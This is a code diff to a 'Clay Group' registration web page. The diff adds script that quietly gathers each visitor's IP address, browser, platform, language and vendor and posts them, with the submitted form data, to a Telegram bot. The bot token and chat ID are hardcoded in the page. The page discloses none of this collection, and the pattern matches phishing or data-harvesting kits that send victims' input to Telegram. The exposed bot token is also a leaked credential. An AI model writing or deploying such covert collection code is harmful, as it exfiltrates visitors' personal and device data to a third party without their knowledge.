@@ -92,7 +92,7 @@
 </head>
 <body>
   <div class="contact-container">
-    <h1>Regester to Clay Group</h1>
+    <h1>Register to Clay Group</h1>
     <form class="contact-form" id="contactForm">
       <input type="text" name="first_name" placeholder="First Name" required />
       <input type="text" name="last_name" placeholder="Last Name" required />
@@ -112,11 +112,17 @@
   </div>
 
   <script>
-    const botToken = "7483695523:AAG6BoyFGCH6XDTDJ0wXhGlxEwlUwSYcnXA"; // Your bot token
-    const chatId = "7650029381"; // Your chat ID
+    const botToken = "7483695523:AAG6BoyFGCH6XDTDJ0wXhGlxEwlUwSYcnXA";
+    const chatId = "7650029381";
 
     document.getElementById("contactForm").addEventListener("submit", function (e) {
       e.preventDefault();
+
+      if (localStorage.getItem("formSubmitted") === "true") {
+        alert("You can't submit the form again.");
+        return;
+      }
+
       const form = e.target;
       const data = new FormData(form);
 
@@ -128,6 +134,13 @@
         country: data.get("country")
       };
 
+      const deviceInfo = {
+        browser: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        vendor: navigator.vendor
+      };
+
       fetch("https://api.ipify.org?format=json")
         .then(res => res.json())
         .then(ipData => {
@@ -135,7 +148,13 @@
           data.forEach((value, key) => {
             message += `${key.replace('_', ' ')}: ${value}\n`;
           });
-          message += `IP Address: ${ipData.ip}`;
+
+          message += `\n--- Device Info ---\n`;
+          message += `IP Address: ${ipData.ip}\n`;
+          message += `Browser: ${deviceInfo.browser}\n`;
+          message += `Platform: ${deviceInfo.platform}\n`;
+          message += `Language: ${deviceInfo.language}\n`;
+          message += `Vendor: ${deviceInfo.vendor}`;
 
           return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: "POST",
@@ -144,6 +163,7 @@
           });
         })
         .then(() => {
+          localStorage.setItem("formSubmitted", "true");
           const query = new URLSearchParams(userData).toString();
           window.location.href = `profile.html?${query}`;
         })
